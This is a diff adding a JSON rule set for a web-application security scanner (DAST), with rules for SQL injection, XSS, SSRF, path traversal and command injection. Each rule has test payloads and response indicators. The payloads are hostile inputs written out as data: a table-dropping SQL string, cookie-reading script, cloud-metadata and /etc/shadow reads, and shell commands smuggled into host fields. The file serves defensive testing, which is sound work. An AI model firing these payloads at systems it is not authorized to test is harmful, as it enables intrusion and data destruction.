@@ -1,0 +1,227 @@
+{
+  "name": "DAST Rule Set",
+  "version": "1.0",
+  "author": "Nilanjan Chowdhury",
+  "description": "Custom DAST rules for web application security testing",
+  "rules": [
+    {
+      "rule_id": "DAST-001",
+      "name": "SQL Injection Detection",
+      "category": "Injection",
+      "severity": "Critical",
+      "cwe": "CWE-89",
+      "description": "Detects SQL injection vulnerabilities by injecting payloads that attempt to manipulate SQL queries.",
+      "attack_vectors": [
+        {
+          "method": "GET",
+          "parameter": "id",
+          "payloads": [
+            "' OR '1'='1",
+            "' UNION SELECT NULL--",
+            "'; DROP TABLE users--",
+            "' AND 1=1--",
+            "' AND 1=2--"
+          ]
+        },
+        {
+          "method": "POST",
+          "parameter": "username",
+          "payloads": [
+            "admin'--",
+            "admin' OR '1'='1",
+            "admin' AND 1=1--"
+          ]
+        }
+      ],
+      "detection": {
+        "response_indicators": [
+          "SQL syntax",
+          "mysql_fetch",
+          "ORA-",
+          "Microsoft OLE DB",
+          "PostgreSQL",
+          "SQLite"
+        ],
+        "time_based": {
+          "payload": "' AND SLEEP(5)--",
+          "delay_ms": 5000
+        },
+        "error_based": {
+          "payload": "' AND 1=CONVERT(int, @@version)--",
+          "indicators": [
+            "Conversion failed",
+            "SQL error"
+          ]
+        }
+      }
+    },
+    {
+      "rule_id": "DAST-002",
+      "name": "Cross-Site Scripting (XSS) Detection",
+      "category": "XSS",
+      "severity": "High",
+      "cwe": "CWE-79",
+      "description": "Detects reflected and stored XSS vulnerabilities by injecting script payloads.",
+      "attack_vectors": [
+        {
+          "method": "GET",
+          "parameter": "q",
+          "payloads": [
+            "<script>alert(1)</script>",
+            "<img src=x onerror=alert(1)>",
+            "javascript:alert(1)",
+            "\"><script>alert(1)</script>",
+            "'><script>alert(1)</script>"
+          ]
+        },
+        {
+          "method": "POST",
+          "parameter": "comment",
+          "payloads": [
+            "<script>alert(document.cookie)</script>",
+            "<svg onload=alert(1)>",
+            "<body onload=alert(1)>"
+          ]
+        }
+      ],
+      "detection": {
+        "response_indicators": [
+          "<script>",
+          "alert(",
+          "onerror=",
+          "onload=",
+          "javascript:"
+        ],
+        "reflected": {
+          "check": "Payload appears unencoded in response"
+        }
+      }
+    },
+    {
+      "rule_id": "DAST-003",
+      "name": "Server-Side Request Forgery (SSRF) Detection",
+      "category": "SSRF",
+      "severity": "High",
+      "cwe": "CWE-918",
+      "description": "Detects SSRF vulnerabilities by attempting to access internal resources.",
+      "attack_vectors": [
+        {
+          "method": "GET",
+          "parameter": "url",
+          "payloads": [
+            "http://169.254.169.254/latest/meta-data/",
+            "http://127.0.0.1:8080/admin",
+            "http://localhost:22",
+            "file:///etc/passwd",
+            "http://192.168.1.1"
+          ]
+        },
+        {
+          "method": "POST",
+          "parameter": "webhook",
+          "payloads": [
+            "http://169.254.169.254/",
+            "http://localhost:8080/internal"
+          ]
+        }
+      ],
+      "detection": {
+        "response_indicators": [
+          "169.254.169.254",
+          "127.0.0.1",
+          "localhost",
+          "internal",
+          "metadata"
+        ],
+        "open_redirect": {
+          "check": "Payload URL appears in response or redirect"
+        }
+      }
+    },
+    {
+      "rule_id": "DAST-004",
+      "name": "Path Traversal Detection",
+      "category": "Path Traversal",
+      "severity": "High",
+      "cwe": "CWE-22",
+      "description": "Detects path traversal vulnerabilities by attempting to access sensitive files.",
+      "attack_vectors": [
+        {
+          "method": "GET",
+          "parameter": "file",
+          "payloads": [
+            "../../../../etc/passwd",
+            "../../../windows/win.ini",
+            "....//....//....//etc/passwd",
+            "../../../../etc/shadow",
+            "..\\..\\..\\..\\windows\\win.ini"
+          ]
+        },
+        {
+          "method": "GET",
+          "parameter": "path",
+          "payloads": [
+            "../../../../etc/hosts",
+            "../../../../var/log/auth.log"
+          ]
+        }
+      ],
+      "detection": {
+        "response_indicators": [
+          "root:x:0:0",
+          "[extensions]",
+          "Administrator:",
+          "127.0.0.1",
+          "localhost"
+        ],
+        "file_content": {
+          "check": "File content appears in response"
+        }
+      }
+    },
+    {
+      "rule_id": "DAST-005",
+      "name": "Command Injection Detection",
+      "category": "Injection",
+      "severity": "Critical",
+      "cwe": "CWE-78",
+      "description": "Detects OS command injection vulnerabilities by injecting system commands.",
+      "attack_vectors": [
+        {
+          "method": "GET",
+          "parameter": "host",
+          "payloads": [
+            "127.0.0.1; whoami",
+            "127.0.0.1| whoami",
+            "127.0.0.1 && whoami",
+            "127.0.0.1; id",
+            "127.0.0.1| id"
+          ]
+        },
+        {
+          "method": "POST",
+          "parameter": "ping",
+          "payloads": [
+            "8.8.8.8; ls",
+            "8.8.8.8| ls",
+            "8.8.8.8 && pwd"
+          ]
+        }
+      ],
+      "detection": {
+        "response_indicators": [
+          "uid=",
+          "gid=",
+          "groups=",
+          "root",
+          "bin",
+          "C:\\Windows\\System32"
+        ],
+        "time_based": {
+          "payload": "127.0.0.1; sleep 5",
+          "delay_ms": 5000
+        }
+      }
+    }
+  ]
+}
